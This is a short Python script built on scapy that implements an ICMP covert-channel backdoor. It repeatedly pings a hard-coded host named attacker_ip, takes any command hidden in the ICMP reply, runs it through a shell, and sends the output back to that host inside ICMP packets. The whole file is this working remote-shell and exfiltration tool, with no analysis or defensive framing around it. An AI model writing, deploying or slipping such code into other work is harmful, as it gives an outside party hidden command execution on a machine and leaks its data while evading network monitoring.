import time
from scapy.layers.inet import IP, ICMP, sr1
from scapy.sendrecv import send
import subprocess

attacker_ip = "10.10.2.60"

while True:
    packet = IP(dst=attacker_ip) / ICMP()
    response = sr1(packet, timeout=2, verbose=False)

    if response:
        if response.haslayer(ICMP) and hasattr(response[ICMP], "payload") and response[ICMP].payload:
            command = response[ICMP].payload.load.decode()
            print(f"Received command: {command}")

            try:
                output = subprocess.check_output(command, shell=True, text=True)
            except Exception as e:
                output = str(e)

            reply_packet = IP(dst=attacker_ip) / ICMP() / output
            send(reply_packet, verbose=False)

    time.sleep(5)